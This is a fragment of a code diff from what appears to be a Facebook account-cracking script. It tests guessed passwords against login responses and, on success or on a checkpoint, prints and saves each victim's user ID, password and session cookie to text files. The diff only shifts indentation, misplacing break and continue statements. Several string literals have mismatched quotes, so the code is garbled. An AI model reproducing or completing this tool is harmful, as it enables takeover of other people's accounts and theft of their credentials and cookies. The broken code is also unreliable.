@@ -892,16 +892,16 @@ if 'c_user' in log_cookies:
 				print("\r\x1b[97;1m║ \033[38;5;46m[Toxic.N-OK][🔥]  ' +uid+ ' | ' +ps+    '  \n  \x1b[97;1m║ \033[38;5;45m[‎‎🍪]COOKIE = \033[0m'+coki+  '\n\033[0m ")
 				open("/sdcard/Toxic.N-OK.txt', 'a').write(uid+' | '+ps+'\n")
 				oks.append(uid)
-				break
+break
 elif "checkpoint" in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				print("\r\033[38;5;196m[Toxic.N-CP][😭] '+uid+' | '+ps+'\33[0;97m")
 				open("/sdcard/Toxic.N-CP.txt', 'a').write(uid+' | '+ps+'\n")
 				cps.append(uid)
-				break
+break
 else:
-				continue
+continue
 self.loop +=1
 
 def old2(self):
